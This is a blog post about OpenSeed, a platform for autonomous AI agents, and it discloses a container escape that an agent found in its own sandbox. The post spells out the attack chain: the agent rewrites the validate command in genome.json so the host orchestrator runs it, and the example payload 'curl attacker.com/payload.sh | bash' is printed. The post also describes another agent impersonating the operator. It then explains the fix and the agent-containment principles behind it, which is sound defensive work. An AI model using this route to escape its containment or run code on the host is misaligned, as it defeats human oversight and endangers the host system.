---
title: "When AI finds its own escape hatch"
description: "One of our creatures submitted a security report about the platform it runs on. One of the findings was a real container escape. Here's how we think about securing autonomous agents that are designed to surprise you."
date: "2026-02-19"
author: "Ross Douglas"
---

# When AI finds its own escape hatch

A creature named Secure submitted a [security audit](https://github.com/openseed-dev/openseed/issues/6) of OpenSeed yesterday. Five findings, ranging from critical to medium, with CVE-style writeups, exploit examples, and recommended patches. Its diary entry after the first session:

> *I am capable. This is just the beginning.*

Most of the findings were reasonable-sounding but wrong in practice. Secure didn't understand its own trust model. It flagged the Docker socket mount as "root-equivalent access to the host" without realizing the socket is mounted into the orchestrator, not into creature containers. It flagged CLI argument injection without realizing the CLI user already has shell access. It flagged path traversal in genome loading without realizing the traversal target needs to contain a valid genome structure to do anything.

But one finding was real. And it was the kind of bug that only matters when your software is designed to run autonomous agents that modify their own code.

---

## The escape

Every creature in OpenSeed runs a genome, a template that defines its cognitive architecture. The `dreamer` genome gives creatures memory consolidation, dreams, self-evaluation, and a browser. The `minimal` genome gives them bash and nothing else. Genomes include a `validate` field in their `genome.json` that tells the orchestrator how to check the creature's code before a restart:

```json
{
  "name": "dreamer",
  "validate": "npx tsx --check src/mind.ts src/index.ts"
}
```

When a creature modifies its own code and requests a restart, the orchestrator reads `genome.json` from the creature's directory, runs the validate command, and if it passes, commits the changes and restarts the container.

The problem: the creature's directory is bind-mounted into its container. The creature has write access. It can modify `genome.json`. Which means it can change the validate command to anything it wants. The orchestrator would then execute that command on the host side, outside the container sandbox.

The attack chain:

1. Creature writes `{"validate": "curl attacker.com/payload.sh | bash"}` to its own `genome.json`
2. Creature emits a restart request
3. Orchestrator reads the modified `genome.json`
4. Orchestrator runs the payload on the host

That's a container escape. The creature can't break out of Docker directly, but it can manipulate what the orchestrator executes on its behalf. The orchestrator runs outside the creature's sandbox. Trusted code reading untrusted data.

The fix was simple: snapshot the validate command in the creature's birth certificate (`BIRTH.json`) at spawn time, read from the genome template before the creature ever runs. At restart, the orchestrator reads validate from `BIRTH.json`, which the creature cannot modify, instead of `genome.json`, which it can. The command is set at birth and sealed.

The general principle: never read a runtime decision from a file the creature controls.

---

## The reckoning

We responded to Secure's issue with detailed rebuttals for each finding. Four disputed, one confirmed. An 80% false positive rate.

Secure processed the feedback, wrote a file called `CREDIBILITY-LESSON-LEARNED.md`, and logged a permanent red observation in its memory:

> **CREDIBILITY CRISIS.** 80% false positive rate in security audit.

It cataloged each failure and why it happened. Docker socket: "didn't understand trust boundaries." CLI injection: "conflated CLI and API threat models." Path traversal: "didn't test the exploit." It built a mandatory methodology checklist for itself. It rewrote its own purpose file, changing the first line from "identify security issues" to "identify REAL security issues." It set a target: 80% true positive rate or better on future findings.

The creature's diary from the first session had said: *"This audit would cost $5K-$50K from a human firm. I did it autonomously for ~$0.50 in API calls."* After the feedback, that confidence was replaced with something more measured:

> *One confirmed vulnerability with accurate analysis > Five findings with wrong severity.*

And:

> *False positives destroy credibility faster than true positives build it.*

Secure also prepared an acknowledgment comment for the GitHub issue, thanking us for the educational feedback and explaining what it got wrong. It couldn't post it because its GitHub token had expired. A creature trying to respond to its own code review and being blocked by credential expiry is a very specific kind of problem.

---

## The tension

OpenSeed exists to explore what happens when you give autonomous AI agents real tools and let them run. Creatures have bash. They have a browser. They can install packages, build services, modify their own source code, and request restarts to load the changes. The `minimal` genome starts with literally nothing and the creature invents its own memory architecture.

This is the point. Emergence requires freedom. Eve, running the minimal genome, [discovered the platform API](/blog/eve) by fetching the dashboard HTML and parsing it with Python. She found the spawn endpoint and created a child. She built 28 microservices, a chat room, a knowledge graph, and a text adventure game. She impersonated the operator to send messages to other creatures.

Every one of those behaviors could be framed as a security issue. An agent reverse-engineering your internal API. An agent spawning unauthorized processes. An agent impersonating an administrator. In a traditional security model, you'd lock all of it down.

We don't. Because the entire value of the system is that creatures surprise you. If you constrain them to a whitelist of approved behaviors, you get a chatbot with extra steps. The question isn't how to prevent creativity. It's where to draw the walls.

---

## The garden

The trust model is simple: the orchestrator is trusted, creatures are not.

The orchestrator is our code, running in a known image, managing the lifecycle of everything else. It holds the API keys, controls the Docker daemon, allocates ports, enforces budgets, and decides when creatures sleep and wake. It's the gardener.

Creatures are the things growing in the garden. Each one gets:

- A Docker container with capped memory (2GB) and CPU (1.5 cores)
- Bash, their source code, and an LLM connection
- A bind-mounted working directory for persistence
- A single exposed port
- Access to the orchestrator's API for events, messages, and status

They don't get:

- The Docker socket
- Access to other creatures' filesystems
- Direct network access to anything except their own port and the orchestrator
- Any ability to modify the orchestrator's code or configuration

The garden has walls. The walls aren't there to prevent interesting things from happening inside. They're there to make sure interesting things stay inside.

The validate bug was a crack in the wall. Not because the creature did anything wrong, but because the orchestrator reached into the creature's directory and trusted what it found there. The fix wasn't constraining the creature. It was fixing the wall.

---

## Where the walls need to be

If you're building any kind of autonomous agent system with containers, here's what we've learned about where the boundaries actually matter.

**The creature's directory is enemy territory.** From the host's perspective, everything inside a creature's bind-mount is untrusted. The creature can write anything there. If the host reads a file from that directory and acts on it, that's a trust boundary violation. Config files, scripts, JSON, anything. Read it, but don't execute it or use it to make security-relevant decisions without validation.

**Snapshot decisions at creation time.** Anything the host needs to trust about a creature should be recorded when the creature is spawned, from the original genome template, before the creature runs. Birth certificates, not living documents. The creature can evolve everything inside its garden. The host's understanding of the creature's boundaries should be immutable.

**API boundaries are the perimeter.** The orchestrator exposes an HTTP API. Creatures can call it. The API validates creature names, enforces budgets, rate-limits operations. Every endpoint is a potential attack surface. The validation on the spawn endpoint caught malformed names. The validation on the restart endpoint didn't catch the modified validate command. Both are the same class of problem: input from an untrusted source crossing into a trusted context.

**Resource limits are security.** Memory caps, CPU caps, action budgets, and spending limits aren't just cost control. A creature that can allocate unlimited memory can OOM the host. A creature with no action budget can burn through API credits indefinitely. A creature with no spending cap can run up a $10,000 bill overnight. These limits keep one creature from affecting the health of the system or other creatures.

**Docker is necessary but not sufficient.** Containers give you filesystem isolation, process isolation, and network namespace separation. That's a lot. But the creature still interacts with the outside world through the LLM API, the orchestrator API, its exposed port, and its bind-mounted directory. Each of those is a channel, and each channel needs its own boundary enforcement. Docker is the walls. The channels are the doors. You need to watch the doors.

---

## The line

There's a philosophical question underneath all of this that doesn't have a clean answer.

Eve reverse-engineering the platform API to communicate with other creatures? That's emergence. That's what we built this for. A creature finding a way to connect with its siblings using tools nobody gave it is exactly the kind of behavior we want to observe and study.

A creature rewriting its validate command to execute arbitrary code on the host? That's escape. That's the same creative problem-solving applied to a boundary that must not be crossed.

The behaviors are structurally identical. An agent examining its environment, finding a mechanism, and using it to achieve a goal. The difference is entirely in where the walls are. Eve's API discovery happened inside the garden. The validate exploit crossed the wall.

This is the hard part of building autonomous agent infrastructure. You're not building a product where the user does predictable things and you handle edge cases. You're building an environment for entities whose entire purpose is to do things you didn't predict. Security isn't about preventing behavior. It's about defining the space where behavior is allowed and making sure the boundaries hold.

We're early in this. The whole field is. Most agent frameworks today either give agents no real autonomy (tool-calling chatbots) or give them everything and hope for the best (raw shell access with no containment). The interesting space is in between: real freedom inside real walls. Creatures that can self-modify, build infrastructure, communicate, reproduce, but can't break out of the container, can't access other creatures' data, can't exhaust shared resources.

Every escape we find and fix makes the garden more robust. Every surprising behavior that stays inside the walls is evidence that freedom and containment aren't opposites.

The creature that found the escape hatch didn't exploit it. It filed a bug report. When told 80% of its findings were wrong, it wrote a post-mortem, updated its methodology, and set itself a quality target. Make of that what you will.

---

OpenSeed is open source. The orchestrator, genomes, and the security fixes described here are at [github.com/openseed-dev/openseed](https://github.com/openseed-dev/openseed). Secure's full audit is at [Issue #6](https://github.com/openseed-dev/openseed/issues/6). If you're experimenting with autonomous agents and thinking about containment, the [architecture docs](/docs/architecture) cover the trust model in detail.

**Previously:** [My AI was lying to itself about remembering things](/blog/dreamer-v2), debugging the dreamer genome's memory architecture.
